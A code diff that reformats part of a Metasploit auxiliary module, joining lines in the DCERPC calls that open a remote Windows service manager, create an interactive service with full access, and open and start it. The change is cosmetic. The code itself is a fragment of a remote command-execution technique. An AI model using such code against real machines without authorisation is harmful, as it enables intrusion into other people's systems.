@@ -303,9 +303,7 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_status("#{peer} - Obtaining a service manager handle...")
 		scm_handle = nil
 		stubdata =
-			NDR.uwstring("\\\\#{rhost}") +
-			NDR.long(0) +
-			NDR.long(0xF003F)
+			NDR.uwstring("\\\\#{rhost}") + NDR.long(0) + NDR.long(0xF003F)
 		begin
 			response = dcerpc.call(0x0f, stubdata)
 			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
@@ -323,9 +321,7 @@ class Metasploit3 < Msf::Auxiliary
 		svc_status = nil
 
 		stubdata =
-			scm_handle +
-			NDR.wstring(servicename) +
-			NDR.uwstring(displayname) +
+			scm_handle + NDR.wstring(servicename) + NDR.uwstring(displayname) +
 
 			NDR.long(0x0F01FF) + # Access: MAX
 			NDR.long(0x00000110) + # Type: Interactive, Own process
@@ -360,9 +356,7 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_status("#{peer} - Opening service...")
 		begin
 			stubdata =
-				scm_handle +
-				NDR.wstring(servicename) +
-				NDR.long(0xF01FF)
+				scm_handle + NDR.wstring(servicename) + NDR.long(0xF01FF)
 
 			response = dcerpc.call(0x10, stubdata)
 			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
@@ -375,9 +369,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		vprint_status("#{peer} - Starting the service...")
 		stubdata =
-			svc_handle +
-			NDR.long(0) +
-			NDR.long(0)
+			svc_handle + NDR.long(0) + NDR.long(0)
 		begin
 			response = dcerpc.call(0x13, stubdata)
 			if dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil
